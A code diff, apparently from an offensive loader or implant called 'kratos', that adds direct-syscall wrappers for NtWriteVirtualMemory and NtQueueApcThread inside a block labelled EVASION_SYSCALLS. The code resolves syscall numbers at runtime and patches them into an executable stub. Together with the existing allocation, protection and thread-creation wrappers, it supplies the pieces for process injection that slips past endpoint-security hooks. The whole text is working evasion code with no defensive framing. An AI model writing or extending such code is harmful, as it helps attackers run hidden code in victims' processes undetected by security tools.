@@ -291,12 +291,40 @@ NTSTATUS kratos_NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess
                           ZeroBits, StackSize, MaximumStackSize, AttributeList);
 }
 
+NTSTATUS kratos_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
+                                     PVOID Buffer, SIZE_T NumberOfBytesToWrite,
+                                     PSIZE_T NumberOfBytesWritten) {
+    static DWORD ssn = (DWORD)-1;
+    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtWriteVirtualMemory");
+    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
+    *(DWORD*)(g_stub + 4) = ssn;
+    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
+    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+    return ((fn_t)g_stub)(ProcessHandle, BaseAddress, Buffer,
+                          NumberOfBytesToWrite, NumberOfBytesWritten);
+}
+
+NTSTATUS kratos_NtQueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine,
+                                  PVOID ApcArgument1, PVOID ApcArgument2,
+                                  PVOID ApcArgument3) {
+    static DWORD ssn = (DWORD)-1;
+    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtQueueApcThread");
+    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
+    *(DWORD*)(g_stub + 4) = ssn;
+    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
+    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, PVOID, PVOID);
+    return ((fn_t)g_stub)(ThreadHandle, ApcRoutine, ApcArgument1,
+                          ApcArgument2, ApcArgument3);
+}
+
 static void init_syscalls(void) {
     /* Pre-resolve SSNs while ntdll is still accessible.
      * Calling each resolver once caches the SSN in the static local. */
     kratos_resolve_ssn("NtAllocateVirtualMemory");
     kratos_resolve_ssn("NtProtectVirtualMemory");
     kratos_resolve_ssn("NtCreateThreadEx");
+    kratos_resolve_ssn("NtWriteVirtualMemory");
+    kratos_resolve_ssn("NtQueueApcThread");
 }
 #endif /* EVASION_SYSCALLS */
 
